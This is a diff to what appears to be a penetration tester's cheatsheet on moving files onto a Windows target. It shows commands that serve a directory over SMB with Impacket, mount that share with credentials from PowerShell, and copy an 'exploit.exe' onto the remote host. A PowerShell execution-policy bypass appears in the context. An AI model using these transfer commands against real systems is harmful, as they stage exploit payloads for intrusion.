@@ -67,7 +67,7 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File 
 ## SMB with Impacket
 [[Impacket-Cheatsheet]]
 ```bash
-impacket-smbserver scriptserver $(pwd) -smb2support -user user -password pass
+impacket-smbserver scriptserver $(pwd) #-smb2support -user user -password pass
 ```
 On remote:
 ```powershell
@@ -76,9 +76,10 @@ $cred = New-Object System.Management.Automation.PSCredential('user', $pass)
 New-PSDrive -Name user -PSProvider FileSystem -Credential $cred -Root \\$IP
 ```
 
-```bash
-python3 smbserver.py ROPNOP /path/to/exploit
+```powershell
 copy \$IP\ROPNOP\exploit.exe
+#Or
+xcopy \\$ip\scriptserver\$scriptname-here
 ```
 
 ## CertUtil
